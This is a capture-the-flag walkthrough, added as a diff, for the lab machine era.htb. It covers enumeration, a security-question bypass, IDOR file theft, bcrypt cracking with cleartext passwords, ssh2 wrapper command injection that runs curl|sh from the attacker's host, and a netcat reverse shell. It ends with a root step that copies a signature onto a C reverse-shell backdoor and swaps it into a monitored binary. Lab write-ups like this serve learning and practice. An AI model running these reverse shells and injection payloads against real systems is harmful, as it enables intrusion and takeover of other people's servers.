@@ -1,0 +1,148 @@
+nmap -sV era.htb
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+
+no ssh but ftp?????????
+
+FTP works somewhat like ssh w/ login, if we try to login anonymously:
+ftp era.htb 
+(enter anonymous as username)
+
+Nope doesn't work. Going to the webpage now.
+
+We can find an email near the contact info: support@era.htb
+
+The webpage is just one page, so in the meantime we will run feroxbuster and fuff:
+- feroxbuster -u http://era.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[####################] - 10s     4990/4990    503/s   http://era.htb/img/ 
+[####################] - 10s     4990/4990    505/s   http://era.htb/css/ 
+[####################] - 10s     4990/4990    502/s   http://era.htb/js/fancybox/ 
+[####################] - 10s     4990/4990    510/s   http://era.htb/js/
+- ffuf -u http://era.htb -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.era.htb" -fs 154 
+Take note of the size and adjust the command accordingly.
+
+We actually find a subdomain: file.era.htb!
+
+We can notice file uploads, security question logon, etc. This is running off Era storage, which is 
+
+From this point on we will work w/ Burp Suite and attempt to see what the security questions may leak, if anything.
+
+When we go to the security questions page, it denotes that a user is not available. However, brute forcing the users IS possible, as proven with submitting admin, the page responds w/ wrong answers being given for the other questions.
+
+Therefore, admin is a crackable user.
+
+admin for all prompts works LOL. Now we just need to upload stuff to the server. We can assume that since the website is written in PHP, we can upload a PHP reverse shell payload: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php, making sure to edit IP and port.
+
+Upon upload, a download link is given. Grabbing the download will download the stuff to our machine.
+
+Chroma notes that an IDOR (insecure direct object reference); access to an object we should not have access to. Since the download URL contains a UID for each upload, we can load it into intruder and see if any files are present. 
+
+The first URL given is this: http://file.era.htb/download.php?id=7852, we can add a payload after id= in Intruder and check for 200 requests.
+
+We can see that any response that returns "File not found" in render has length 7969, so we can look for anything greater/less than that size.
+
+---
+
+Chroma cannot logon as the admin user so it may be that someone MADE this user??????????????
+
+ID 54 shows an archive with site-backup! Unzipping the archive shows a filedb.sqlite file, opening in DB browser shows:
+
+admin_ef01cab31aa	$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
+eric			$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
+veronica		$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
+yuri			$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
+john			$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
+ethan			$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
+
+Let's get crackin (grok gave us command: hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --potfile-disable):
+
+admin_ef01cab31aa	$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
+eric:america
+veronica		$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
+yuri:mustang
+john			$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
+ethan			$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
+
+Yuri logon for ftp works! We can download a bunch of the files and investigate them now too.
+
+Findings:
+- file.conf gives what may be the user flag FTP user: webmaster@localhost
+
+Going back to intruder we can see another archive, signing.zip, is available. We can inspect both files:
+- openssl x509 -in key.pem -text -noout
+- openssl rsa -in x509.genkey -check
+
+The first command gives back an email for yuri: yurivich@era.com
+
+The second fails, and can't find a private key.
+
+---
+
+Not much found at this point and no user yet.
+
+---
+
+Notes from chroma:
+- admin user was fake, someone made it. It's an unintended path.
+- We can register an account with the register.php endpoint, through directory enumeration.
+	- Register then change security questions for OTHER users; REGARDLESS of authentication, OR get SQL DB from intruder attack.
+	- Sign in as admin user	who will have signing and site backup zip archives.
+		- In the site backup archive, the ssh2.so (shared object) can be used to spawn a shell on the server through a cURL request by forcing an ssh session to open up (https://www.php.net/manual/en/wrappers.ssh2.php).
+
+---
+
+Steps to user:
+1. Register user on file.era.htb/register.php then change security questions for admin user.
+2. Login as admin user (shown in sql DB) and get PHPSESSID from burp OR go to Web Dev tools --> Storage.
+3. Start Penelope (https://github.com/brightio/penelope)
+4. Make zbi.sh script with a single line: mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.14.235 4444 >/tmp/s
+5. Create python web server w/ zbi hosted in it.
+6. curl --path-as-is -i -s -k \
+  -b "PHPSESSID=upeq7800t6m3hqpajjm2euik2m" \
+  "http://file.era.htb/download.php?id=150&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://10.10.14.235:8000/zbi.sh|sh;"
+7. Get shell and user flag.
+
+Steps to root:
+- We're abusing an active cronjob, which we will hijack to spawn a root shell. 
+
+1. cd /tmp
+2. Make a C program called john.c:
+
+#include <stdlib.h>
+int main() {
+    system("/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/4445 0>&1'");
+    return 0;
+}
+
+3. Make the following bash script called rootme.sh containing:
+
+cd /tmp
+
+echo "[+] Writing reverse shell C backdoor..."
+cat << EOF > john.c
+
+#include <stdlib.h>
+int main() {
+    system("/bin/bash -c 'bash -i >& /dev/tcp/<your ip>/4445 0>&1'");
+    return 0;
+}
+EOF
+
+echo "[+] Compiling statically..."
+gcc -static -o john john.c
+
+echo "[+] Extracting valid .text_sig section from original binary..."
+objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
+
+echo "[+] Adding signature to backdoor..."
+objcopy --add-section .text_sig=sig john
+
+echo "[+] Replacing monitored binary (wait 10–20 seconds after)..."
+cp john /opt/AV/periodic-checks/monitor
+
+echo "[+] Done. Start your listener on port 4445."
+
+4. On attack host; nc -nvlp 4445
+5. chmod +x rootme.sh
+6. ./rootme.sh and get root frfr
